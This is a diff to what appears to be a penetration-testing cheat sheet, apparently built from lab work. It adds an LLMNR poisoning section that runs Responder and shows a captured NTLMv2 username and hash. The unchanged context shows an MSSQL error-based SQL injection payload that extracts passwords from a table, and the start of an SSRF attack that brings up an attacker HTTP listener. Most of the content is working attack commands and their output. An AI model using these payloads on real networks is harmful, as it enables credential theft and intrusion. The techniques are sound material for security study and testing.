@@ -646,11 +646,30 @@ psw
 ', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
 cb2d5be3c78be06d47b697468ad3b33b
 ````
+### llmnr-poisoning-responder
+````
+https://juggernaut-sec.com/llmnr-poisoning-responder/
+````
+````
+responder -I tun0 -wv
+````
+![image](https://user-images.githubusercontent.com/127046919/233516797-36702551-f60a-4d0e-866a-7c3a8e2971c1.png)
+
+````
+
+[+] Listening for events...                                                                                                                                                                                                                 
+
+[HTTP] Sending NTLM authentication request to 192.168.54.165
+[HTTP] GET request from: ::ffff:192.168.54.165  URL: / 
+[HTTP] NTLMv2 Client   : 192.168.54.165
+[HTTP] NTLMv2 Username : HEIST\enox
+[HTTP] NTLMv2 Hash     : enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
+````
 ### SSRF
 SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.
 
 <img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />
-
+#### Example attack
 ````
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
